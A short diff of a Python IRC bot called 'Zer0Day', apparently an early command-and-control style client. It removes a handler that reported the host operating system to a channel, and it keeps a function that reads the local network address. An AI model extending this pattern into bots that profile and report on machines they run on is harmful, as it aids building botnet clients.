@@ -29,7 +29,6 @@ channel = "#lolcakes"
 botnick = ("Zer0Day" + x)
 
 def readCommand(args):
-	#command = text.split()[-1]
 	command = args[3][1:]
 	
 def sayHello(text):
@@ -38,19 +37,6 @@ def sayHello(text):
 		to = t[1].strip() #this code is for getting the first word after !hi
 		irc.send('PRIVMSG '+channel+' :Hello Commander, lovely day is it not?' + '\r\n')
 	
-	if text.find(':os') !=-1: #you can change !hi to whatever you want
-		t = text.split(':os') #you can change t and to :)
-		to = t[1].strip() #this code is for getting the first word after !hi
-		if (sys.platform == 'win32'):	
-			irc.send('PRIVMSG '+channel+' : Windows.' +str(to)+' \r\n')
-			return("windows")
-		elif(sys.platform == 'linux2'):
-			irc.send('PRIVMSG '+channel+' : Linux.' +str(to)+'! \r\n')
-		elif(sys.platform == 'darwin'): #Mac from 10.4 onward
-			irc.send('PRIVMSG '+channel+' : Darwin.' + str(to)+'! \r\n')
-		else: #No fucking idea
-			irc.send('PRIVMSG '+channel+' : I have no idea what Im doing with my life...'+str(to)+'! \r\n')	
-
 def getInfo(text):
 	'''Local eth0 address'''
 	intf = "eth0"
